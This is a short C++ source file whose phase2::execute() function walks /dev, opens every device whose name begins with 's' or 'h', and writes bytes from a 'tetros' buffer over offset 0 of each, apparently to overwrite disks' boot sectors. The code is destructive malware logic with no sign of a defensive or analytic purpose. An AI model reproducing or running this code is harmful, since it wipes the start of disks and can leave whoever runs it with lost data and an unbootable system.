#include "phase2.h"

phase2::phase2()
{

}



int phase2::execute()
{
	int secsToWait;
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir ("/dev")) != NULL) {
	  /* print all the files and directories within directory */
	  while ((ent = readdir (dir)) != NULL) {
 	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
	   {
	        printf ("%s\n", ent->d_name);
        	int fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
        	lseek(fd, 0, SEEK_SET);
        	write(fd, tetros, 4);
        	close(fd);
        	//perror("perror output:");
		//fclose(fh);
	   }
 	 }
 	 closedir (dir);
	} else {
 	 /* could not open directory */
  	perror ("");
  	return EXIT_FAILURE;
	}

	secsToWait = 2;

	sleep(secsToWait);
	//this project was a failure.
	return 0;
}

